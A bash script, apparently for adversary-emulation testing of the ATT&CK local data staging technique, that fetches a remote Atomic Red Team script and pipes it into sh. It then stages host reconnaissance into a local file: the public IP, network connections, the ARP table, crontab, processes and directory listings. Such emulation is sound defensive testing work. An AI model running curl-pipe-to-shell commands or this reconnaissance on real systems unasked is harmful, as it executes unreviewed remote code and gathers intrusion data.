#!/bin/bash

# Create the output folder if it doesn't exist
output_folder="./Linux_output/Collection"
mkdir -p "$output_folder"

# Output file path
output_file="$output_folder/T1074.001_Collection.txt"

# Function to install 'curl' if needed
install_curl_if_needed() {
    if ! command -v curl &> /dev/null; then
        echo "'curl' command not found. Installing it..."
        if [ "$(uname)" = 'Linux' ]; then
            if command -v apt-get &> /dev/null; then
                sudo apt-get update
                sudo apt-get install -y curl
            elif command -v yum &> /dev/null; then
                sudo yum install -y curl
            elif command -v dnf &> /dev/null; then
                sudo dnf install -y curl
            else
                echo "Error: Package manager not found. Manual installation of 'curl' required."
                exit 1
            fi
        elif [ "$(uname)" = 'FreeBSD' ]; then
            if command -v pkg &> /dev/null; then
                sudo pkg update
                sudo pkg install -y curl
            else
                echo "Error: Package manager 'pkg' not found. Manual installation of 'curl' required."
                exit 1
            fi
        else
            echo "Error: Unsupported platform. Manual installation of 'curl' required."
            exit 1
        fi

        if ! command -v curl &> /dev/null; then
            echo "Failed to install 'curl'. Please install it manually and try again."
            exit 1
        else
            echo "'curl' installed successfully."
        fi
    else
        echo "'curl' command found."
    fi
}

# Function to download and execute a script
download_and_execute_script() {
    local script_url="https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh"
    curl -s "$script_url" | sh -s > "${output_file}"
}

# Function to run collection commands
run_collection_commands() {
    echo "Running collection commands..."
    {
        echo "Collecting IP information using curl:"
        curl ifconfig.me

        echo
        echo "Collecting network interface configuration:"
        ifconfig

        echo
        echo "Current user:"
        whoami

        echo
        echo "Current directory:"
        pwd

        echo
        echo "List of files and directories in /Users/:"
        ls -lhart /Users/

        echo
        echo "List of applications in /Applications/:"
        ls /Applications/

        echo
        echo "List of items in /Library/:"
        ls /Library/

        echo
        echo "Current user's crontab entries:"
        crontab -l

        echo
        echo "Scheduled jobs in 'at' queue:"
        at -l

        echo
        echo "Listening network connections:"
        netstat -an | grep -i listen

        echo
        echo "Established network connections:"
        netstat -an | grep -i established

        echo
        echo "ARP table:"
        arp -a

        echo
        echo "Process list:"
        ps aux
    } >> "${output_file}"
}

# Main script execution
{
    echo "Script execution started at $(date)"
    echo
    
    install_curl_if_needed
    download_and_execute_script
    run_collection_commands
    
    echo
    echo "Script execution complete at $(date). Output saved to: ${output_file}"
} | tee "${output_file}"

echo "Execution completed. Output saved to ${output_file}"
